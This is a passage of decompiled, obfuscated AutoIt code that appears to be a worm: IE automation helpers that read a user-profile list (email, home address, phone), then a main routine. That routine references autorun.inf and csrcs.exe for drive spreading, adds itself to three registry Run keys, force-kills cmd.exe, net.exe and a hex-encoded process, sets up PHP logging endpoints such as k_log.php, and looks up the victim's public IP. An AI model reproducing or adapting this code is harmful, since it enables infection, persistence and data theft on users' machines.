			$Local000E[0][0x000C] = "Email"
			$Local000E[0][0x000D] = "FirstName"
			$Local000E[0][0x000E] = "Gender"
			$Local000E[0][0x000F] = "Home.City"
			$Local000E[0][0x0010] = "Home.Country"
			$Local000E[0][0x0011] = "Home.Fax"
			$Local000E[0][0x0012] = "Home.Phone"
			$Local000E[0][0x0013] = "Home.State"
			$Local000E[0][0x0014] = "Home.StreetAddress"
			$Local000E[0][0x0015] = "Home.Zipcode"
			$Local000E[0][0x0016] = "Homepage"
			$Local000E[0][0x0017] = "JobTitle"
			$Local000E[0][0x0018] = "LastName"
			$Local000E[0][0x0019] = "MiddleName"
			$Local000E[0][0x001A] = "Notes"
			$Local000E[0][0x001B] = "Office"
			$Local000E[0][0x001C] = "Pager"
			For $Var0273 = 0 To 0x001C
				$Local000E[1][$Var0273] = Execute('$o_object.document.parentWindow.top.navigator.userProfile.getAttribute("' & $Local000E[0][$Var0273] & '")')
			Next
			Return SetError($Var025F, 0, $Local000E)
		Case $Arg01 = "referrer"
			Return SetError($Var025F, 0, $ArgRef00.document.referrer)
		Case $Arg01 = "theatermode"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.TheaterMode)
		Case $Arg01 = "toolbar"
			If Not Fn0089($ArgRef00, "browser") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			EndIf
			Return SetError($Var025F, 0, $ArgRef00.ToolBar)
		Case $Arg01 = "contenteditable"
			If Fn0089($ArgRef00, "browser") Or Fn0089($ArgRef00, "document") Then
				$Local0013 = $ArgRef00.document.body
			Else
				$Local0013 = $ArgRef00
			EndIf
			Return SetError($Var025F, 0, $Local0013 .isContentEditable)
		Case $Arg01 = "innertext"
			If Fn0089($ArgRef00, "documentcontainer") Or Fn0089($ArgRef00, "document") Then
				$Local0013 = $ArgRef00.document.body
			Else
				$Local0013 = $ArgRef00
			EndIf
			Return SetError($Var025F, 0, $Local0013 .innerText)
		Case $Arg01 = "outertext"
			If Fn0089($ArgRef00, "documentcontainer") Or Fn0089($ArgRef00, "document") Then
				$Local0013 = $ArgRef00.document.body
			Else
				$Local0013 = $ArgRef00
			EndIf
			Return SetError($Var025F, 0, $Local0013 .outerText)
		Case $Arg01 = "innerhtml"
			If Fn0089($ArgRef00, "documentcontainer") Or Fn0089($ArgRef00, "document") Then
				$Local0013 = $ArgRef00.document.body
			Else
				$Local0013 = $ArgRef00
			EndIf
			Return SetError($Var025F, 0, $Local0013 .innerHTML)
		Case $Arg01 = "outerhtml"
			If Fn0089($ArgRef00, "documentcontainer") Or Fn0089($ArgRef00, "document") Then
				$Local0013 = $ArgRef00.document.body
			Else
				$Local0013 = $ArgRef00
			EndIf
			Return SetError($Var025F, 0, $Local0013 .outerHTML)
		Case $Arg01 = "title"
			Return SetError($Var025F, 0, $ArgRef00.document.title)
		Case $Arg01 = "uniqueid"
			If Fn0089($ArgRef00, "window") Then
				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
				Return SetError($Var0263, 1, 0)
			Else
				Return SetError($Var025F, 0, $ArgRef00.uniqueID)
			EndIf
		Case Else
			Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidValue", "Invalid Property")
			Return SetError($Var0264, 2, 0)
	EndSelect
EndFunc

Func Fn0083($ArgOpt00 = -1)
	Switch Number($ArgOpt00)
		Case -1
			Return $Var0251
		Case 0
			$Var0251 = False
			Return 1
		Case 1
			$Var0251 = True
			Return 1
		Case Else
			Fn008A("Error", "_IEErrorNotify", "$_IEStatus_InvalidValue")
			Return 0
	EndSwitch
EndFunc

Func Fn0084(ByRef $ArgRef00)
	If Not IsObj($ArgRef00) Then
		Fn008A("Error", "_IEQuit", "$_IEStatus_InvalidDataType")
		Return SetError($Var0262, 1, 0)
	EndIf
	If Not Fn0089($ArgRef00, "browser") Then
		Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
		Return SetError($Var0263, 1, 0)
	EndIf
	$ArgRef00.quit()
	$ArgRef00 = 0
	Return SetError($Var025F, 0, 1)
EndFunc

Func Fn0085($Arg00)
	Local $Local000F = DllCall("user32.dll", "bool", "LockSetForegroundWindow", "uint", $Arg00)
	If @error Or $Local000F[0] Then Return SetError(1, Fn0079(), 0)
	Return $Local000F[0]
EndFunc

Func Fn0086(ByRef $ArgRef00)
	DllCall("ole32.dll", "long", "CoInitialize", "ptr", 0)
	If @error Then Return SetError(2, @error, 0)
	Local Const $Var0274 = Fn0087("WM_HTML_GETOBJECT")
	Local Const $Var0275 = 2
	Local $Var0276
	Fn0088($ArgRef00, $Var0274, 0, 0, $Var0275, 0x03E8, $Var0276)
	Local $Local0010 = DllStructCreate("int;short;short;byte[8]")
	DllStructSetData($Local0010, 1, 0x626FC520)
	DllStructSetData($Local0010, 2, 0xA41E)
	DllStructSetData($Local0010, 3, 0x11CF)
	DllStructSetData($Local0010, 4, 0x00A7, 1)
	DllStructSetData($Local0010, 4, 0x0031, 2)
	DllStructSetData($Local0010, 4, 0, 3)
	DllStructSetData($Local0010, 4, 0x00A0, 4)
	DllStructSetData($Local0010, 4, 0x00C9, 5)
	DllStructSetData($Local0010, 4, 8, 6)
	DllStructSetData($Local0010, 4, 0x0026, 7)
	DllStructSetData($Local0010, 4, 0x0037, 8)
	Local $Local000F = DllCall("oleacc.dll", "long", "ObjectFromLresult", "lresult", $Var0276, "ptr", DllStructGetPtr($Local0010), "wparam", 0, "idispatch*", 0)
	If @error Then Return SetError(3, @error, 0)
	If IsObj($Local000F[4]) Then
		Local $Local0011 = $Local000F[4] .Script()
		Return $Local0011 .Document.parentwindow
	Else
		Return SetError(1, $Local000F[0], 0)
	EndIf
EndFunc

Func Fn0087($Arg00)
	Local $Local000F = DllCall("user32.dll", "uint", "RegisterWindowMessageW", "wstr", $Arg00)
	If @error Then Return SetError(@error, @extended, 0)
	If $Local000F[0] = 0 Then Return SetError(10, Fn0079(), 0)
	Return $Local000F[0]
EndFunc

Func Fn0088($Arg00, $Arg01, $Arg02, $Arg03, $Arg04, $Arg05, ByRef $ArgRef06, $ArgOpt07 = 0, $ArgOpt08 = "int", $ArgOpt09 = "int")
	Local $Local000F = DllCall("user32.dll", "lresult", "SendMessageTimeout", "hwnd", $Arg00, "uint", $Arg01, $ArgOpt08, $Arg02, $ArgOpt09, $Arg03, "uint", $Arg04, "uint", $Arg05, "dword_ptr*", "")
	If @error Or $Local000F[0] = 0 Then
		$ArgRef06 = 0
		Return SetError(1, Fn0079(), 0)
	EndIf
	$ArgRef06 = $Local000F[7]
	If $ArgOpt07 >= 0 And $ArgOpt07 <= 4 Then Return $Local000F[$ArgOpt07]
	Return $Local000F
EndFunc

Func Fn0089(ByRef $ArgRef00, $Arg01)
	If Not IsObj($ArgRef00) Then
		Return SetError($Var0262, 1, 0)
	EndIf
	Local $Local000B = Fn008B()
	If Not $Local000B Then Fn008A("Warning", "internal function __IEIsObjType", "Cannot register internal error handler, cannot trap COM errors", "Use _IEErrorHandlerRegister() to register a user error handler")
	Local $Local000C = Fn0083()
	Fn000A(False)
	Local $Local0012 = String(ObjName($ArgRef00)), $Var0277 = False
	Switch $Arg01
		Case "browserdom"
			Local $Local0013 = $ArgRef00.document
			If Fn0089($ArgRef00, "documentcontainer") Then
				$Var0277 = True
			ElseIf Fn0089($ArgRef00, "document") Then
				$Var0277 = True
			ElseIf Fn0089($Local0013, "document") Then
				$Var0277 = True
			EndIf
		Case "browser"
			If ($Local0012 = "IWebBrowser2") Or ($Local0012 = "IWebBrowser") Then $Var0277 = True
		Case "window"
			If $Local0012 = "DispHTMLWindow2" Then $Var0277 = True
		Case "documentContainer"
			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "browser") Then $Var0277 = True
		Case "document"
			If $Local0012 = "DispHTMLDocument" Then $Var0277 = True
		Case "table"
			If $Local0012 = "DispHTMLTable" Then $Var0277 = True
		Case "form"
			If $Local0012 = "DispHTMLFormElement" Then $Var0277 = True
		Case "forminputelement"
			If ($Local0012 = "DispHTMLInputElement") Or ($Local0012 = "DispHTMLSelectElement") Or ($Local0012 = "DispHTMLTextAreaElement") Then $Var0277 = True
		Case "elementcollection"
			If ($Local0012 = "DispHTMLElementCollection") Then $Var0277 = True
		Case "formselectelement"
			If $Local0012 = "DispHTMLSelectElement" Then $Var0277 = True
		Case Else
			Return SetError($Var0264, 2, 0)
	EndSwitch
	Fn0083($Local000C)
	Fn008C()
	If $Var0277 Then
		Return SetError($Var025F, 0, 1)
	Else
		Return SetError($Var0263, 1, 0)
	EndIf
EndFunc

Func Fn008A($Arg00, $Arg01, $ArgOpt02 = "", $ArgOpt03 = "")
	If $Var0251 Or $Var024F Then
		Local $Local0014 = "--> IE.au3 " & $Var024B[5] & " " & $Arg00 & " from function " & $Arg01
		If Not String($ArgOpt02) = "" Then $Local0014 &= ", " & $ArgOpt02
		If Not String($ArgOpt03) = "" Then $Local0014 &= " (" & $ArgOpt03 & ")"
		ConsoleWrite($Local0014 & @CRLF)
	EndIf
	Return 1
EndFunc

Func Fn008B()
	Local $Local0015 = ObjEvent("AutoIt.Error")
	If $Local0015 <> "" And Not IsObj($Var0252) Then
		Return SetError($Var0260, 0, 0)
	EndIf
	$Var0252 = ""
	$Var0252 = ObjEvent("AutoIt.Error", "Fn008D")
	If IsObj($Var0252) Then
		Return SetError($Var025F, 0, 1)
	Else
		Return SetError($Var0260, 0, 0)
	EndIf
EndFunc

Func Fn008C()
	$Var0252 = ""
	If $Var0253 <> "" Then
		$Var0252 = ObjEvent("AutoIt.Error", $Var0253)
	EndIf
	Return SetError($Var025F, 0, 1)
EndFunc

Func Fn008D()
	$Var0257 = $Var0252 .scriptline
	$Var0254 = $Var0252 .number
	$Var0255 = Hex($Var0252 .number, 8)
	$Var0256 = StringStripWS($Var0252 .description, 2)
	$Var0258 = StringStripWS($Var0252 .WinDescription, 2)
	$Var0259 = $Var0252 .Source
	$Var025A = $Var0252 .HelpFile
	$Var025B = $Var0252 .HelpContext
	$Var025C = $Var0252 .LastDllError
	$Var025E = ""
	$Var025E &= "--> COM Error Encountered in " & @ScriptName & @CRLF
	$Var025E &= "----> $IEComErrorScriptline = " & $Var0257 & @CRLF
	$Var025E &= "----> $IEComErrorNumberHex = " & $Var0255 & @CRLF
	$Var025E &= "----> $IEComErrorNumber = " & $Var0254 & @CRLF
	$Var025E &= "----> $IEComErrorWinDescription = " & $Var0258 & @CRLF
	$Var025E &= "----> $IEComErrorDescription = " & $Var0256 & @CRLF
	$Var025E &= "----> $IEComErrorSource = " & $Var0259 & @CRLF
	$Var025E &= "----> $IEComErrorHelpFile = " & $Var025A & @CRLF
	$Var025E &= "----> $IEComErrorHelpContext = " & $Var025B & @CRLF
	$Var025E &= "----> $IEComErrorLastDllError = " & $Var025C & @CRLF
	If $Var0251 Or $Var024F Then ConsoleWrite($Var025E & @CRLF)
	SetError($Var0261)
	Return
EndFunc

Func Fn008E()
	Select
		Case ($Var0254 = -0x7FFDFFF7) Or (String($Var0256) = "Access is denied.")
			Return $Var0267
		Case ($Var0254 = -0x7FFEFEF8) Or (String($Var0258) = "The object invoked has disconnected from its clients.")
			Return $Var0268
		Case Else
			Return $Var025F
	EndSelect
EndFunc
Global Const $Var0278 = "long X;long Y"
Global Const $Var0279 = "dword Length;ptr Descriptor;bool InheritHandle"

Func Fn008F($Arg00, $ArgOpt01 = 0)
	Local Const $Var027A = 0x00B7
	Local Const $Var027B = 1
	Local $Local0016 = 0
	If BitAND($ArgOpt01, 2) Then
		Local $Local0017 = DllStructCreate("dword[5]")
		Local $Local0018 = DllStructGetPtr($Local0017)
		Local $Local000F = DllCall("advapi32.dll", "bool", "InitializeSecurityDescriptor", "ptr", $Local0018, "dword", $Var027B)
		If @error Then Return SetError(@error, @extended, 0)
		If $Local000F[0] Then
			$Local000F = DllCall("advapi32.dll", "bool", "SetSecurityDescriptorDacl", "ptr", $Local0018, "bool", 1, "ptr", 0, "bool", 0)
			If @error Then Return SetError(@error, @extended, 0)
			If $Local000F[0] Then
				Local $Local0019 = DllStructCreate($Var0279)
				DllStructSetData($Local0019, 1, DllStructGetSize($Local0019))
				DllStructSetData($Local0019, 2, $Local0018)
				DllStructSetData($Local0019, 3, 0)
				$Local0016 = DllStructGetPtr($Local0019)
			EndIf
		EndIf
	EndIf
	Local $Local001A = DllCall("kernel32.dll", "handle", "CreateMutexW", "ptr", $Local0016, "bool", 1, "wstr", $Arg00)
	If @error Then Return SetError(@error, @extended, 0)
	Local $Local001B = DllCall("kernel32.dll", "dword", "GetLastError")
	If @error Then Return SetError(@error, @extended, 0)
	If $Local001B[0] = $Var027A Then
		If BitAND($ArgOpt01, 1) Then
			Return SetError($Local001B[0], $Local001B[0], 0)
		Else
			Exit -1
		EndIf
	EndIf
	Return $Local001A[0]
EndFunc
Global Const $Var027C = 2
Global Const $Var027D = Ptr(-1)
Global Const $Var027E = Ptr(-1)
Global Const $Var027F = 0x0100
Global Const $Var0280 = 0x2000
Global Const $Var0281 = 0x8000
Global Const $Var0282 = BitShift($Var027F, 8)
Global Const $Var0283 = BitShift($Var0280, 8)
Global Const $Var0284 = BitShift($Var0281, 8)

Func Fn0090($Arg00, ByRef $ArgRef01, ByRef $ArgRef02, ByRef $ArgRef03)
	If Number($Arg00) > 0 Then
		$Arg00 = Int($Arg00 / 0x03E8)
		$ArgRef01 = Int($Arg00 / 0x0E10)
		$Arg00 = Mod($Arg00, 0x0E10)
		$ArgRef02 = Int($Arg00 / 0x003C)
		$ArgRef03 = Mod($Arg00, 0x003C)
		Return 1
	ElseIf Number($Arg00) = 0 Then
		$ArgRef01 = 0
		$Arg00 = 0
		$ArgRef02 = 0
		$ArgRef03 = 0
		Return 1
	Else
		Return SetError(1, 0, 0)
	EndIf
EndFunc

Func Fn0091(ByRef $ArgRef00, $Arg01)
	If Not IsArray($ArgRef00) Then Return SetError(1, 0, -1)
	If UBound($ArgRef00, 0) <> 1 Then Return SetError(2, 0, -1)
	Local $Local001C = UBound($ArgRef00)
	ReDim $ArgRef00[$Local001C + 1]
	$ArgRef00[$Local001C] = $Arg01
	Return $Local001C
EndFunc

Func Fn0092(ByRef $ArgRef00, $Arg01, $ArgOpt02 = "")
	If Not IsArray($ArgRef00) Then Return SetError(1, 0, 0)
	If UBound($ArgRef00, 0) <> 1 Then Return SetError(2, 0, 0)
	Local $Local001C = UBound($ArgRef00) + 1
	ReDim $ArgRef00[$Local001C]
	For $Var0273 = $Local001C - 1 To $Arg01 + 1 Step -1
		$ArgRef00[$Var0273] = $ArgRef00[$Var0273 - 1]
	Next
	$ArgRef00[$Arg01] = $ArgOpt02
	Return $Local001C
EndFunc

Func Fn0093(ByRef $ArgRef00, ByRef $ArgRef01)
	Local $Local001D = $ArgRef00
	$ArgRef00 = $ArgRef01
	$ArgRef01 = $Local001D
EndFunc

Func Fn0094(Const ByRef $ArgCRef00, $ArgOpt01 = "|", $ArgOpt02 = 0, $ArgOpt03 = 0)
	If Not IsArray($ArgCRef00) Then Return SetError(1, 0, "")
	If UBound($ArgCRef00, 0) <> 1 Then Return SetError(3, 0, "")
	Local $Var0285, $Local001C = UBound($ArgCRef00) - 1
	If $ArgOpt03 < 1 Or $ArgOpt03 > $Local001C Then $ArgOpt03 = $Local001C
	If $ArgOpt02 < 0 Then $ArgOpt02 = 0
	If $ArgOpt02 > $ArgOpt03 Then Return SetError(2, 0, "")
	For $Var0273 = $ArgOpt02 To $ArgOpt03
		$Var0285 &= $ArgCRef00[$Var0273] & $ArgOpt01
	Next
	Return StringTrimRight($Var0285, StringLen($ArgOpt01))
EndFunc

Func Fn0095($Arg00)
	If StringLeft($Arg00, 2) = "0x" Then Return BinaryToString($Arg00)
	Return BinaryToString("0x" & $Arg00)
EndFunc

Func Fn0096($Arg00, $Arg01, $Arg02, $ArgOpt03 = -1)
	Local $Local001E = ""
	If $ArgOpt03 = Default Or $ArgOpt03 = -1 Then $Local001E = "(?i)"
	Local $Local001F = "(\.|\||\*|\?|\+|\(|\)|\{|\}|\[|\]|\^|\$|\\)"
	$Arg01 = StringRegExpReplace($Arg01, $Local001F, "\\$1")
	$Arg02 = StringRegExpReplace($Arg02, $Local001F, "\\$1")
	If $Arg01 = "" Then $Arg01 = "\A"
	If $Arg02 = "" Then $Arg02 = "\z"
	Local $Local0020 = StringRegExp($Arg00, "(?s)" & $Local001E & $Arg01 & "(.*?)" & $Arg02, 3)
	If @error Then Return SetError(1, 0, 0)
	Return $Local0020
EndFunc

Func Fn0097($Arg00, $Arg01, $Arg02)
	Local $Var0286, $Var0287, $Var0288
	If $Arg00 = "" Or (Not IsString($Arg00)) Then
		Return SetError(1, 0, $Arg00)
	ElseIf $Arg01 = "" Or (Not IsString($Arg00)) Then
		Return SetError(2, 0, $Arg00)
	Else
		$Var0286 = StringLen($Arg00)
		If (Abs($Arg02) > $Var0286) Or (Not IsInt($Arg02)) Then
			Return SetError(3, 0, $Arg00)
		EndIf
	EndIf
	If $Arg02 = 0 Then
		Return $Arg01 & $Arg00
	ElseIf $Arg02 > 0 Then
		$Var0287 = StringLeft($Arg00, $Arg02)
		$Var0288 = StringRight($Arg00, $Var0286 - $Arg02)
		Return $Var0287 & $Arg01 & $Var0288
	ElseIf $Arg02 < 0 Then
		$Var0287 = StringLeft($Arg00, Abs($Var0286 + $Arg02))
		$Var0288 = StringRight($Arg00, Abs($Arg02))
		Return $Var0287 & $Arg01 & $Var0288
	EndIf
EndFunc

Func Fn0098($Arg00)
	Local $Local0021 = FileOpen($Arg00, $Var027C)
	If $Local0021 = -1 Then Return SetError(1, 0, 0)
	Local $Local0022 = FileWrite($Local0021, "")
	FileClose($Local0021)
	If $Local0022 = -1 Then Return SetError(2, 0, 0)
	Return 1
EndFunc

Func Fn0099($Arg00, $Arg01, $Arg02, $ArgOpt03 = 0)
	If $Arg01 <= 0 Then Return SetError(4, 0, 0)
	If Not IsString($Arg02) Then
		$Arg02 = String($Arg02)
		If $Arg02 = "" Then Return SetError(6, 0, 0)
	EndIf
	If $ArgOpt03 <> 0 And $ArgOpt03 <> 1 Then Return SetError(5, 0, 0)
	If Not FileExists($Arg00) Then Return SetError(2, 0, 0)
	Local $Local0023 = FileRead($Arg00)
	Local $Local0024 = StringSplit(StringStripCR($Local0023), @LF)
	If UBound($Local0024) < $Arg01 Then Return SetError(1, 0, 0)
	Local $Local0025 = FileOpen($Arg00, $Var027C)
	If $Local0025 = -1 Then Return SetError(3, 0, 0)
	$Local0023 = ""
	For $Var0273 = 1 To $Local0024[0]
		If $Var0273 = $Arg01 Then
			If $ArgOpt03 = 1 Then
				If $Arg02 <> "" Then $Local0023 &= $Arg02 & @CRLF
			Else
				$Local0023 &= $Arg02 & @CRLF & $Local0024[$Var0273] & @CRLF
			EndIf
		ElseIf $Var0273 < $Local0024[0] Then
			$Local0023 &= $Local0024[$Var0273] & @CRLF
		ElseIf $Var0273 = $Local0024[0] Then
			$Local0023 &= $Local0024[$Var0273]
		EndIf
	Next
	FileWrite($Local0025, $Local0023)
	FileClose($Local0025)
	Return 1
EndFunc

Func Fn009A()
	Local $Var0289, $Var028A
	If InetGet("http://checkip.dyndns.org/?rnd1=" & Random(1, 0x00010000) & "&rnd2=" & Random(1, 0x00010000), @TempDir & "\~ip.tmp") Then
		$Var0289 = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
		FileDelete(@TempDir & "\~ip.tmp")
		$Var0289 = StringTrimLeft($Var0289, StringInStr($Var0289, ":") + 1)
		$Var0289 = StringTrimRight($Var0289, StringLen($Var0289) - StringInStr($Var0289, "/") + 2)
		$Var028A = StringSplit($Var0289, ".")
		If $Var028A[0] = 4 And StringIsDigit($Var028A[1]) And StringIsDigit($Var028A[2]) And StringIsDigit($Var028A[3]) And StringIsDigit($Var028A[4]) Then
			Return $Var0289
		EndIf
	EndIf
	If InetGet("http://www.whatismyip.com/?rnd1=" & Random(1, 0x00010000) & "&rnd2=" & Random(1, 0x00010000), @TempDir & "\~ip.tmp") Then
		$Var0289 = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
		FileDelete(@TempDir & "\~ip.tmp")
		$Var0289 = StringTrimLeft($Var0289, StringInStr($Var0289, "Your ip is") + 10)
		$Var0289 = StringLeft($Var0289, StringInStr($Var0289, " ") - 1)
		$Var0289 = StringStripWS($Var0289, 8)
		$Var028A = StringSplit($Var0289, ".")
		If $Var028A[0] = 4 And StringIsDigit($Var028A[1]) And StringIsDigit($Var028A[2]) And StringIsDigit($Var028A[3]) And StringIsDigit($Var028A[4]) Then
			Return $Var0289
		EndIf
	EndIf
	Return SetError(1, 0, -1)
EndFunc

Func Fn009B($Arg00, $ArgOpt01 = True)
	Local $Local0026 = INETREAD($Arg00, 1)
	Local $Local0027 = @error, $Var028B = @extended
	If $ArgOpt01 Then $Local0026 = BinaryToString($Local0026)
	Return SetError($Local0027, $Var028B, $Local0026)
EndFunc
AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
$Var028C = "cftuon.exe"
$Var028D = "cftuon"
$Var028E = "cftu.exe"
$Var028F = "cftu"
If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
	Run(@ComSpec & " /c " & "explorer " & @ScriptDir, "", @SW_HIDE)
	If @error Then
	EndIf
	Sleep(0x0BB8)
	If Fn008F("981dsaf81wae98f19c8v98r1aeg1", 1) = 0 Then
		Exit
	EndIf
EndIf
If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028C Then
	If Fn008F("c9d5s169d5f19581g19s8g1g", 1) = 0 Then
		Exit
	EndIf
EndIf
If FileExists("95a1sd.xx") Then
	$Var0290 = FileRead("95a1sd.xx")
	If @AutoItExe = $Var0290 Then
		FileWrite("vvfd", "")
		Exit
	EndIf
EndIf
$Var0291 = "alokium.exe"
$Var0292 = "csrcs.exe"
$Var0293 = "autorun.inf"
$Var0294 = "autorun.i"
$Var0295 = "autorun.in"
$Var0296 = "csrcs"
$Var0297 = "khy"
$Var0298 = "csrcs.au3"
$Var0299 = "NTrun.au3"
$Var029A = "HKLM\Software\Microsoft\DRM\amty"
$Var029B = "-1"
$Var029C = 0
$Var029D = 0
$Var029E = 0
$Var029F = ""
$Var02A0 = ""
$Var02A1 = ""
$Var02A2 = "kiu"
$Var02A3 = "View files"
$Var02A4 = ""
$Var02A5 = "-"
$Var02A6 = "-"
$Var02A7 = Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & ".exe"
$Var02A8 = $Var02A7
$Var02A9 = $Var02A7
$Var02AA = 0
$Var02AB = 0
$Var02AC = 0
Global $Var02AD
Global $Var02AE
Global $Var02AF
$Var02B0 = 0
$Var02B1 = 0x007F
$Var02B2 = 0
$Var02B3 = 0
$Var02B4 = 1
$Var02B5 = 0
$Var02B6 = 0
$Var02B7 = 0
$Var02B8 = 0
$Var02B9 = 0
$Var02BA = "_PE04E6B7463C3BD27"
$Var02BB = ""
$Var02BC = ""
$Var02BD = ""
$Var02BE = ""
$Var02BF = ""
$Var02C0 = ""
$Var02C1 = ""
$Var02C2 = ""
$Var02C3 = 1
$Var02C4 = ""
$Var02C5 = 0
$Var02C6 = "none"
$Var02C7 = "none"
$Var02C8 = "none"
$Var02C9 = "none"
$Var02CA = "none"
$Var02CB = "none"
$Var02CC = "none"
$Var02CD = "none"
$Var02CE = 0
$Var02CF = 0
$Var02D0 = 0
$Var02D1 = 0
$Var02D2 = 0
$Var02D3 = ""
$Var02D4 = ""
$Var02D5 = ""
$Var02D6 = ""
$Var02D7 = 0
$Var02D8 = 1
$Var02D9 = 1
$Var02DA = 0
Global $Var02DB
Global $Var02DC
Global $Var02DD
Global $Var02DE
Global $Var02DF
Global $Var02E0
Global $Var02E1
Global $Var02E2
Global $Var02E3
Global $Var02E4
Global $Var02E5
Global $Var02E6
Global $Var02E7
Global $Var02D5
Global $Var02D6
Global $Var02D3
Global $Var02D4
Global $Var02E8
Global $Var02E9
Global $Var02EA
Global $Var02EB
Global $Var02EC
Global $Var02ED
Global $Var02EE
Global $Var029E
Global $Var02EF
Global $Var02F0
Global $Var02F1
Global $Var02F2
Global $Var02B0
Global $Var02F3
Global $Var02F4
Global $Var02F5
Global $Var02F6
Global $Var02F7
Global $Var02F8
Global $Var02F9
Global $Var02FA
Global $Var02FB
Global $Var02FC
Global $Var02FD
Global $Var02FE
Global $Var02FF
Global $Var0300
Global $Var0301, $Var0302
Global $Var0303, $Var0304, $Var0305, $Local002B, $Var0306, $Var0307, $Var0308, $Var0309, $Var030A, $Var030B, $Var030C, $Var030D, $Var030E
Global $Var030F, $Var0310
Global $Var0311 = "RegShellSM.exe"
Global $Var0312, $Var0313, $Var0314, $Var0315
$Var0316 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x0001869F, 1) & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC
$Var0317 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x270F, 1)
$Var0318 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & ".da"
Global $Var0319 = @HomeDrive & "\" & $Var0316 & "\" & $Var0317 & "\"
Global $Var031A = $Var0319 & $Var0318, $Var031B
Global $Var031C
$Var031D = ""
$Var031E = ""
$Var031F = ""
$Var0320 = ""
$Var0308 = ""
$Var0321 = ""
$Var0322 = ""
$Var0323 = ""
$Var0324 = ""
$Var0325 = ""
$Var0326 = ""
$Var0327 = "a_log.php"
$Var0328 = "f_log.php"
$Var0329 = "e_log.php"
$Var032A = "k_log.php"
$Var032B = "l_log.php"
$Var032C = "s_log.php"
$Var032D = "d_log.php"
$Var0302 = ""
$Var032E = ""
$Var02DD = 0
$Var02DE = 0
$Var02EB = 0
$Var02E1 = 0
$Var032F = ""
$Var0330 = ""
$Var0331 = ""
$Var0332 = ""
$Var0333 = ""
$Var0334 = ""
$Var0335 = ""
$Var0336 = ""
$Var0337 = ""
$Var0338 = ""
$Var0339 = ""
$Var033A = ""
$Var033B = ""
$Var033C = ""
$Var033D = ""
$Var033E = ""
If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028E Then
	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
	If ProcessExists($Var0292) Then
		ProcessClose($Var0292)
		Sleep(0x01F4)
		If ProcessExists($Var0292) Then
			ProcessWaitClose($Var0292, 0x003C)
		EndIf
	EndIf
	If ProcessExists("cmd.exe") Then
		ProcessClose("cmd.exe")
		Sleep(0x01F4)
		If ProcessExists("cmd.exe") Then
			ProcessWaitClose("cmd.exe", 0x003C)
		EndIf
	EndIf
	If ProcessExists("net.exe") Then
		ProcessClose("net.exe")
		Sleep(0x01F4)
		If ProcessExists("net.exe") Then
			ProcessWaitClose("net.exe", 0x003C)
		EndIf
	EndIf
	Fn00A4()
	Fn00A2()
	$Var02A7 = $Var028E
	Fn00AA()
	Sleep(10 * 0x03E8)
	Sleep(10 * 0x003C * 0x03E8)
	If ProcessExists($Var0292) Then
		If FileGetVersion(@SystemDir & "\" & $Var028E) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
			If RegRead($Var029A, "exp1") <> "" Then
				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028F)
				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028F)
				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028F)
				Fn00A3()
			EndIf
